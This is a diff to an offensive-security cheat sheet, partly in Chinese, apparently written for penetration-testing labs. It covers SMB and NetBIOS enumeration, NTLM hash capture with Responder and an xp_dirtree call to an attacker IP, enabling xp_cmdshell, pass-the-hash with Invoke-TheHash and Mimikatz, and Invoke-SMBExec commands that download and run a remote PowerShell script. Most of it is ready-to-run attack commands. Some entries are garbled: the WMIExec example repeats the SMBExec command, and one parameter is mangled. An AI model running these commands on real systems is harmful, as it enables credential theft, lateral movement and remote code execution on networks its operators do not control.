@@ -125,10 +125,11 @@ User-Agent: () { :;}; echo; /usr/bin/python3 -c 'import os; os.system("/bin/ping
 ```
 
 ### SMB
-[smbclient](https://oldgrayduck.blogspot.com/2021/06/centos7-smbclient-windows.html?m=0)
++ [smbclient](https://oldgrayduck.blogspot.com/2021/06/centos7-smbclient-windows.html?m=0)
 
 ```
-smb  -L //IP/dir name  -U useraccount
+smbclient -N -L //{IP}
+smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
 smbclient -L //<attackerIP>/<folder> --option='client min protocol=NT1'
 
 nmap --script smb-vuln* -p port IP
@@ -137,10 +138,18 @@ nmap --script smb-vuln* -p port IP
 smbclient //<IP>/<share>
 
 ```
-smbmap
-`smbmap -u admin -p password1 -d workgroup -H IP`
 
-enum4linux
++ smbmap
+
+```
+smbmap -H {IP}
+smbmap -H {IP} -u null -p null
+smbmap -H {IP} -u guest
+smbmap -u admin -p password1 -d workgroup -H IP
+
+```
+
++ enum4linux
 
 ```
 enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
@@ -148,8 +157,29 @@ enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
 nmap --script "safe or smb-enum-*" -p 445 <IP>
 ```
 
++ SMB server version
+```
+#!/bin/sh
+#Author: rewardone
+#Description:
+# Requires root or enough permissions to use tcpdump
+# Will listen for the first 7 packets of a null login
+# and grab the SMB Version
+#Notes:
+# Will sometimes not capture or will print multiple
+# lines. May need to run a second time for success.
+if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
+if [ ! -z $2 ]; then rport=$2; else rport=139; fi
+tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
+echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
+echo "" && sleep .1
+```
+
 ### [NetBIOS](https://www.kali.org/tools/nbtscan/)
-nbtscan 
++ nbtscan
+`nbtscan -r 192.168.0.1/24`
+
++ NBNSpoof 
 
 ### WhoPort
 + 139,445 => SMB
@@ -178,9 +208,58 @@ crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
 ```
 
 ### 提權
+
 PsExec
 `psexec.exe -s -i cmd.exe`
 
-###  NTLM
+### [LM，NTLM，Net-NTLMv2](https://book.hacktricks.xyz/windows-hardening/ntlm)
+
+[Responder](https://github.com/lgandx/Responder)
+[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)
+
+```
+# steal NTLM hash
+responder -I <interface>
+SQL> exec master ..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' 
+
+#try to enable code execution 
+SQL> enable_xp_cmdshell
+
+#Execute code, 2 sintax, for complex and non complex cmds
+SQL> xp_cmdshell whoami /all
+SQL> EXEC xp_cmdshell 
+```
+
+### password recovery tool
+hashcat
 
 
+### Invoke-TheHash
+
++ Invoke-SMBExec
+
+`Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
+`
+
++ Invoke-WMIExec
+
+`Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose`
+
++ Invoke-SMBClient
+
+`Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose`
+
++ Invoke-SMBEnum
+
+`Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose`
+
++ Invoke-TheHash
+
+`Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0`
+
+>此功能是所有其他功能的混合。 您可以傳遞多個主機，排除某人並選擇您要使用的選項（SMBExec、WMIExec、SMBClient、SMBEnum）。 如果您選擇 SMBExec 和 WMIExec 中的任何一個，但您沒有提供任何 Command 參數，它只會檢查您是否有足夠的權限。
+
+### Pass-the-Hash
+
++ Mimikatz
+` Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' `
